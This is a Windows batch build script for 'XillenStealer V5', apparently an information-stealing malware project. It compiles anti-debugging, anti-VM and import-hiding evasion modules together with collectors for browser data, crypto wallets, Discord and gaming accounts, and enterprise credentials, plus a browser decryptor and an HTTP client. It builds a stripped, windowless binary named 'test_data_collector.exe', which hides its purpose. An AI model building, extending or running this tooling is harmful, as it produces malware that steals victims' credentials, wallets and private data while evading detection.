@echo off
echo XillenStealer V5 C++ Build Script
echo ================================
echo.

if not exist "src\external\sqlite3.c" (
    echo ERROR: sqlite3.c not found in src\external\
    echo Please extract sqlite-amalgamation to this directory
    pause
    exit /b 1
)

echo [*] Cleaning...
if exist test_data_collector.exe del /f /q test_data_collector.exe
if exist *.o del /f /q *.o

echo [*] Building...
C:\msys64\mingw64\bin\g++ -o test_data_collector.exe ^
  src\core\main.cpp ^
  src\core\stealer.cpp ^
  src\evasion\anti_debug.cpp ^
  src\evasion\anti_vm.cpp ^
  src\evasion\api_hammering.cpp ^
  src\evasion\import_hiding.cpp ^
  src\evasion\runtime_decrypt.cpp ^
  src\collectors\browser_collector.cpp ^
  src\collectors\wallet_collector.cpp ^
  src\collectors\app_collector.cpp ^
  src\collectors\discord_collector.cpp ^
  src\collectors\enterprise_collector.cpp ^
  src\collectors\file_grabber.cpp ^
  src\collectors\gaming_collector.cpp ^
  src\collectors\browser_decryptor.cpp ^
  src\crypto\aes.cpp ^
  src\crypto\dpapi.cpp ^
  src\crypto\hash.cpp ^
  src\crypto\chacha20.cpp ^
  src\memory\memory_archive.cpp ^
  src\memory\memory_encrypt.cpp ^
  src\memory\secure_delete.cpp ^
  src\utils\http_client.cpp ^
  src\utils\json_builder.cpp ^
  src\utils\mutex.cpp ^
  src\external\sqlite3.c ^
  -lwininet -lwinhttp -lcrypt32 -liphlpapi -lpsapi -lshell32 -lshlwapi ^
  -O3 -s -static -mwindows -std=c++20

if errorlevel 1 (
    echo.
    echo BUILD FAILED!
    pause
    exit /b 1
)

echo.
echo [+] Build successful!
dir test_data_collector.exe
echo.
echo Ready to test. Run: test_data_collector.exe
pause
